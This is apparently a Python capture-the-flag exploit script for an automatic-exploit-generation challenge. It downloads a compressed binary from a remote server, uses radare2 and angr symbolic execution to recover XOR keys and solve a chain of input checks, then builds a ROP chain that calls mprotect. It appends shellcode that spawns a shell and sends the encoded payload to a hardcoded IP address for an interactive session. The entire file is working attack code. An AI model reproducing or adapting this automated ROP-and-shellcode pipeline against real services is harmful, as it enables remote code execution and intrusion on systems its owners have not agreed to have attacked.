#8!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
from os import system
from pprint import pprint
import claripy
import logging
import r2pipe
import ctypes
import angr
import json
import pdb
import re
import sys
context.binary = "./elf"

local = sys.argv[1] == 'l'
# logging.getLogger('angr').setLevel('ERROR')
if local:
    success("LOCAL TEST")
else:
    # io = remote("pwnable.kr", 9005)
    io = remote("117.78.48.182",  31599)
    io.recvuntil("wait...\n")

    b64 = io.recvuntil("\nhere,", drop = True)
    with open("b64", "wb") as f:
        f.write(b64)
    system("base64 -d ./b64| gunzip > elf; rm ./b64; chmod +x elf")
    #  info("save binary file")

class radare2_and_angr:
    def __init__(self, filename):
        self.r2 = r2pipe.open(filename)
        self.r2.cmd("aa")
        self.main_asm = self.r2.cmd("pdf @ main")
        self.proj = angr.Project(filename)

    def get_xor_keys(self):
        keys = (re.findall(r"xor eax, (.*)", self.main_asm))
        self.key1, self.key2 = [int(i, 16) & 0xff for i in keys]
        info("xor key1 -> {:#x}, key2 -> {:#x}".format(self.key1, self.key2))

    def get_chain_addr(self):
        self.chain = []
        check = int((re.findall(r"call 0x([0-9a-f]*)", self.main_asm))[-1], 16)

        for l in xrange(20):
            self.r2.cmd("s {:#x}".format(check))
            if l < 18:
                check_asm = self.r2.cmd("pd 50").split('ret')[0]
            else:
                check_asm = self.r2.cmd("pd 250").split('ret')[0]
            try:
                self.chain.append(check)
                check = int((re.findall(r"call 0x([0-9a-f]*)", check_asm))[-1], 16)

            except Exception as e:
                info(e)
                # pdb.set_trace()

        self.vuln_addr = check
        self.r2.cmd("s {:#x}".format(self.vuln_addr))
        vuln_asm = self.r2.cmd("pd 200").split('ret')[0]

        # self.payload_addr = int(re.findall(r"mov esi, ([0-9a-fx]+)", vuln_asm)[0], 16)
        self.payload_addr = int(re.findall(r"lea rax, \[([0-9a-fx]+)\]", vuln_asm)[0], 16)
        self.padding = (int(re.findall(r"lea rax, \[rbp - ([0-9a-fx]+)\]", vuln_asm)[0], 16) & 0xff) + 8
	tmp = []
	for id in self.chain:
	    if id not in tmp:
	        tmp.append(id)
	self.chain = tmp
        # for i in self.chain:
        #     print(hex(i))
        # print(len(self.chain))
        # print(hex(self.vuln_addr))
	# pdb.set_trace()

        #  info("vuln_addr -> {:#x}, payload_addr -> {:#x}, padding -> {:#x}".format(vuln_addr, self.payload_addr, self.padding))

    def solve_constraint(self):
        cfg = self.proj.analyses.CFGFast(regions = [(self.proj.entry, self.proj.loader.main_object.max_addr)], force_complete_scan = False)

        self.args = []
        for i in xrange(20):
            if i < 16:
                argv0 = claripy.BVS("argv0", 8)
                argv1 = claripy.BVS("argv1", 8)
                argv2 = claripy.BVS("argv2", 8)
    
                chain_addr = self.chain[i]
                cur_state = self.proj.factory.call_state(chain_addr, argv0, argv1, argv2)
                sm = self.proj.factory.simulation_manager(cur_state)
    
                # chain_func = cfg.functions.function(chain_addr)
                # chain_next = chain_func.get_call_sites()[0]
   		chain_next = self.chain[i + 1] 
                sm.explore(find = chain_next)
                self.args.append(chr(sm.found[0].solver.eval(argv0)))
                self.args.append(chr(sm.found[0].solver.eval(argv1)))
                self.args.append(chr(sm.found[0].solver.eval(argv2)))
        	# print(''.join(self.args).encode('hex'))
            elif i ==  16:
                self.r2.cmd("s {:#x}".format(self.chain[i]))
                check_asm = self.r2.cmd("pd 50")
                # pprint(check_asm)
                movs = re.findall(r"mov dword \[rbp - ([0-9a-fx]+)\], ([0-9a-fx]+)", check_asm)
                '''
               [('4', 'eax'), ('0x20', '4'), ('0x1c', '1'), ('0x18', '2'), ('0x14', '3'), ('0x10', '0'), ('0x40', '5'), ('0x3c', '7'), ('0x38', '6'), ('0x34', '9'), ('0x30', '8'), ('8', 'eax')]
                '''
                # print(movs)
                array = [-1] * 16
                for i in xrange(13):
                    for j in movs:
                        if(j[0] == hex(0x40 - i * 4)):
                            array[i] = int(j[1], 16)
                            continue
                # pdb.set_trace()
                cmp_num = int(re.findall(r"cmp eax, (\d+)", check_asm)[0])
                # print(array, cmp_num)
                # array_14 = array.index(array.index(cmp_num)) - 8
                for i in xrange(48, 0xff + 1):
                    array[-1] = i - 48
                    array[-2] = (i - 48) % 5
                    if( array[array[array[14] + 8]] == cmp_num):
                        self.args.append(chr(i))
                        break
                else:
                    print(array_34)
                    print("not found!")
                
        	# print(''.join(self.args).encode('hex'))
                
            elif i == 17:
                self.r2.cmd("s {:#x}".format(self.chain[i]))
                check_asm = self.r2.cmd("pd 70")
                # pprint(check_asm)
                movs = re.findall(r"mov dword \[rbp - ([0-9a-fx]+)\], ([0-9a-fx]+)", check_asm)
                # print(movs)
                array = [-1] * 36
                for i in xrange(34):
                    for j in movs:
                        if(j[0] == hex(0x90 - i * 4)):
                            array[i] = int(j[1], 16)
                            continue
                # pdb.set_trace()
                cmp_num = int(re.findall(r"cmp eax, ([0-9a-fx]+)", check_asm)[0], 16)
                # # print(array, cmp_num)
                # # v1[v1[v1[v1[34] + 24] + 12]]
                # array_34 = array.index(cmp_num)
                # print(array_34)
                # # v1[v1[v1[34] + 24] + 12]
                # array_34 = array.index(array_34)
                # print(array_34)
                # # v1[v1[34] + 24] + 12
                # array_34 -= 12
                # print(array_34)
                # # v1[v1[34] + 24]
                # array_34 = array.index(array_34)
                # print(array_34)
                # # v1[34] + 24
                # array_34 -= 24
                # print(array_34)
                # # v1[34]
                for i in xrange(48, 0xff + 1):
                    array[-1] = i - 48
                    array[-2] = (i - 48) % 10
                    if(array[array[array[array[34] + 24] + 12]] == cmp_num):
                        self.args.append(chr(i))
                        break
                else:
                    print(array_34)
                    print("not found!")
                
        	# print(''.join(self.args).encode('hex'))
                
            elif i == 18:
                self.r2.cmd("s {:#x}".format(self.chain[i]))
                check_asm = self.r2.cmd("pd 250")
                # print(check_asm)
                movs = re.findall(r"mov dword \[rbp - ([0-9a-fx]+)\], ([0-9a-fx]+)", check_asm)
                # print(movs)
                array = [-1] * 196
                for i in xrange(194):
                    for j in movs:
                        if(j[0] == hex(0x310 - i * 4)):
                            array[i] = int(j[1], 16)
                            continue
                # pdb.set_trace()
                cmp_num = int(re.findall(r"cmp eax, ([0-9a-fx]+)", check_asm)[0], 16)
                # print(array, cmp_num)
                # '''
		# v1[v1[v1[v1[194] + 128] + 64]] == 0x4B 
		# '''
                # array_194 = array.index(cmp_num)
		# # v1[v1[v1[194] + 128] + 64]
                # array_194 = array.index(array_194)
		# # v1[v1[194] + 128] + 64
                # array_194 -= 64
		# # v1[v1[194] + 128]
                # array_194 = array.index(array_194)
		# # v1[194] + 128
                # array_194 -= 128
		# # v1[194]
                for i in xrange(48, 0xff + 1):
                    array[-1] = i - 48
                    array[-2] = (i - 48) % 64
                    if(array[array[array[array[194] + 128] + 64]] == cmp_num):
                        self.args.append(chr(i))
                        break

                else:
                    print(array_194)
                    print("not found!")
                
        	# print(''.join(self.args).encode('hex'))
 
            else:
                self.r2.cmd("s {:#x}".format(self.vuln_addr))
                vuln_asm = self.r2.cmd('pd 10')
                key = re.findall(r"\"(.*)\"", vuln_asm)[0]
                # print(key)
                self.args.append(key)

        # print(''.join(self.args).encode('hex'))

    def rop(self):
        gadgets_addr = json.loads(self.r2.cmd("/cj call qword [r12 + rbx*8]"))[0]['offset']
        self.r2.cmd("s {:#x}".format(gadgets_addr))
        g1 = int(re.findall(r"jne ([0-9a-fx]+)", self.r2.cmd("pd 4"))[0], 16)
        g2 = g1 + 0x1a

        '''
        pwndbg> x/15i 0x8182ce0
        g1 0x8182ce0:	mov    rdx,r13
           0x8182ce3:	mov    rsi,r14
           0x8182ce6:	mov    edi,r15d
           0x8182ce9:	call   QWORD PTR [r12+rbx*8]
           0x8182ced:	add    rbx,0x1
           0x8182cf1:	cmp    rbx,rbp
           0x8182cf4:	jne    0x8182ce0
           0x8182cf6:	add    rsp,0x8
        g2 0x8182cfa:	pop    rbx
           0x8182cfb:	pop    rbp
           0x8182cfc:	pop    r12
           0x8182cfe:	pop    r13
           0x8182d00:	pop    r14
           0x8182d02:	pop    r15
           0x8182d04:	ret 
        '''

        ropchain =  '0' * (self.padding - 8)
        ropchain += flat(
                g2, 
                0, 1, 
                ELF("elf", checksec = False).got['mprotect'], 
                self.payload_addr >> 12 << 12, 0x2000, 7, 
                g1)
        ropchain += '1' * 0x38
        ropchain += flat(self.payload_addr + 0x100)

        ropchain =  ropchain.ljust(0x100, '\x90')
        ropchain += asm(shellcraft.sh())
        
        return ropchain

    def decrypt(self, payload):
        raw_payload = []
        #  pdb.set_trace()
        for idx, ch in enumerate(payload):
            if idx & 1:
                raw_payload.append(self.key2 ^ ord(ch))
            else:
                raw_payload.append(self.key1 ^ ord(ch))

        # print(''.join(map(chr, raw_payload)).encode('hex'))
        return ''.join(map(chr, raw_payload)).encode('hex')


    def get_payload(self):
        self.get_xor_keys()
        self.get_chain_addr()
        self.solve_constraint()

        payload =  ''.join(self.args)
        payload += self.rop()
        payload = self.decrypt(payload)
        success(payload)

        return payload


if __name__ == "__main__":
    p = radare2_and_angr("elf")
    payload = p.get_payload()

    if not local:
        io.sendlineafter("hurry up!\n", payload)
        io.interactive()
